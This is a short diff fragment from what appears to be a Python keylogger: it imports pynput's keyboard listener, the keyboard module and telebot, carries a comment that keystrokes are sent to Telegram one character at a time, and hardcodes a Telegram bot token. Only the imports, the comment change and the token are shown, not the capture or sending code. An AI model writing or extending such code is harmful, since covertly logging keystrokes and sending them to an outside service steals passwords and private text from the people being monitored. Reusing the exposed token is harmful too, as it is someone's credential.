@@ -8,7 +8,7 @@ from pynput.keyboard import Listener
 import keyboard
 import telebot
 
-#this will save keystroke to telegram one by one like sending a message
+#this will save keystroke to telegram every character
 
 # Telegram bot token
 TOKEN = '7076974857:AAH2nRGo9IN9P5g-fo19PFlc-znBfgGVzl4'
